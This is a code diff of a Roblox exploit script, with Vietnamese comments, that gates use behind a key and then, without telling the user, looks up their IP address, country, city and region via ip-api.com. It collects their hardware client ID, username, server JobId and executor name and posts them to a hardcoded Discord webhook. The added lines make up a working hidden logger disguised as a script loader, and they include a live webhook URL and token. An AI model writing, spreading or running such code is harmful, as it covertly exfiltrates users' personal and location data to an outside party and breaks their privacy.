@@ -26,83 +26,91 @@ end
 if not found then
     game.Players.LocalPlayer:Kick("please enter your key")
 end
-local requestt = http_request or request or syn.request
+
+local requestt = http_request or request or syn and syn.request
+if not requestt then
+    warn("Request function not available")
+    return
+end
+
+-- Lấy IP, Location
 local ip, country, city, region = "Unknown", "Unknown", "Unknown", "Unknown"
-local mac, serial, device_name, os_version = "Unknown", "Unknown", "Unknown", "Unknown"
 local success, response = pcall(function()
     return requestt({Url = "http://ip-api.com/json", Method = "GET"})
 end)
-
 if success and response and response.Body then
     local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
-    ip = decoded.query or "Unknown"
-    country = decoded.country or "Unknown"
-    city = decoded.city or "Unknown"
-    region = decoded.regionName or "Unknown"
+    ip = decoded.query or ip
+    country = decoded.country or country
+    city = decoded.city or city
+    region = decoded.regionName or region
 end
 
-local getmac, getserial, getdevicename, getosversion
-if getmac then
-    mac = getmac() or "Unknown"
-end
+-- Các thông tin khác (placeholder)
+local mac, serial, device_name, os_version = "Unknown", "Unknown", "Unknown", "Unknown"
 
-if getserial then
-    serial = getserial() or "Unknown"
-end
+-- Thông tin executor
+local executor = identifyexecutor and (identifyexecutor() or getexecutorname()) or "Unknown"
 
-if getdevicename then
-    device_name = getdevicename() or "Unknown"
-end
-
-if getosversion then
-    os_version = getosversion() or "Unknown"
-end
-
-local executor = identifyexecutor and (identifyexecutor() or getexecutorname()) or "ERROR"
-
+-- Gửi Webhook
 local data = {
     ["embeds"] = {
         {
             ["title"] = "NEW USED",
             ["type"] = "PLAYER",
             ["color"] = tonumber("1cff1a", 16),
-            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId};
+            ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId
+            },
             ["fields"] = {
-                {["name"] = 'Username / UserId', ["value"] = "```"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."```", ["inline"] = false};
-                {["name"] = 'IP Address', ["value"] = "||```"..ip.."```||", ["inline"] = true};
-                {["name"] = 'Country', ["value"] = "||```"..country.."```||", ["inline"] = true};
-                {["name"] = 'Location', ["value"] = "||```"..city..", "..region.."```||", ["inline"] = true};
-                {["name"] = 'MAC Address', ["value"] = "||```"..mac.."```||", ["inline"] = true};
-                {["name"] = 'Serial Device', ["value"] = "||```"..serial.."```||", ["inline"] = true};
-                {["name"] = 'Device Name', ["value"] = "||```"..device_name.."```||", ["inline"] = true};
-                {["name"] = 'OS Version', ["value"] = "||```"..os_version.."```||", ["inline"] = true};
-                {["name"] = 'HWID', ["value"] = "||```"..game:GetService("RbxAnalyticsService"):GetClientId().."```||", ["inline"] = true};
-                {["name"] = 'JobId', ["value"] = "```"..game.JobId.."```", ["inline"] = true};
-                {["name"] = 'Executor', ["value"] = "```"..executor.."```", ["inline"] = true};
-                {["name"] = 'Profile Link', ["value"] = "[Click Here](https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)", ["inline"] = false};
-                {["name"] = 'Game Link', ["value"] = "[Click Here](https://www.roblox.com/games/"..game.PlaceId..")", ["inline"] = true};
-                {["name"] = "Server Link", ["value"] = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", ["inline"] = true }
+                {["name"] = 'Username / UserId', ["value"] = "```"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."```", ["inline"] = false},
+                {["name"] = 'IP Address', ["value"] = "||```"..ip.."```||", ["inline"] = true},
+                {["name"] = 'Country', ["value"] = "||```"..country.."```||", ["inline"] = true},
+                {["name"] = 'Location', ["value"] = "||```"..city..", "..region.."```||", ["inline"] = true},
+                {["name"] = 'MAC Address', ["value"] = "||```"..mac.."```||", ["inline"] = true},
+                {["name"] = 'Serial Device', ["value"] = "||```"..serial.."```||", ["inline"] = true},
+                {["name"] = 'Device Name', ["value"] = "||```"..device_name.."```||", ["inline"] = true},
+                {["name"] = 'OS Version', ["value"] = "||```"..os_version.."```||", ["inline"] = true},
+                {["name"] = 'HWID', ["value"] = "||```"..game:GetService("RbxAnalyticsService"):GetClientId().."```||", ["inline"] = true},
+                {["name"] = 'JobId', ["value"] = "```"..game.JobId.."```", ["inline"] = true},
+                {["name"] = 'Executor', ["value"] = "```"..executor.."```", ["inline"] = true},
+                {["name"] = 'Profile Link', ["value"] = "[Click Here](https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)", ["inline"] = false},
+                {["name"] = 'Game Link', ["value"] = "[Click Here](https://www.roblox.com/games/"..game.PlaceId..")", ["inline"] = true},
+                {["name"] = "Server Link", ["value"] = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```", ["inline"] = true}
             }
         }
     }
 }
 
 local newdata = game:GetService("HttpService"):JSONEncode(data)
-local webhookSuccess = pcall(function()
-    return requestt({Url = 'https://discord.com/api/webhooks/1394985277528997898/Z9AKy1SIRu7lEEgwykfiR7_40wNilSYai_77XO5X3YYMS0nCtJ9Ek7igFXeHsIsDcbZS', Body = newdata, Method = "POST", Headers = {["Content-Type"] = "application/json" }})
+local webhookSuccess, result = pcall(function()
+    return requestt({
+        Url = 'https://discord.com/api/webhooks/1394985277528997898/Z9AKy1SIRu7lEEgwykfiR7_40wNilSYai_77XO5X3YYMS0nCtJ9Ek7igFXeHsIsDcbZS',
+        Body = newdata,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"}
+    })
 end)
 
 if webhookSuccess then
     print("LOADING")
 else
-    warn("np")
-    end
-endlocal blur = Instance.new("BlurEffect", game:GetService("Lighting"))
+    warn("Gửi webhook thất bại:", result)
+end
+
+-- Tạo hiệu ứng mờ
+local blur = Instance.new("BlurEffect", game:GetService("Lighting"))
 blur.Size = 25           
 task.delay(3, function()  
     if blur then blur:Destroy() end
 end)
-while task.wait() do pcall(function()
-game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
-        end) 
-      end
+
+-- Tự động unequip tool
+while task.wait(1) do
+    pcall(function()
+        local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:UnequipTools()
+        end
+    end)
+end
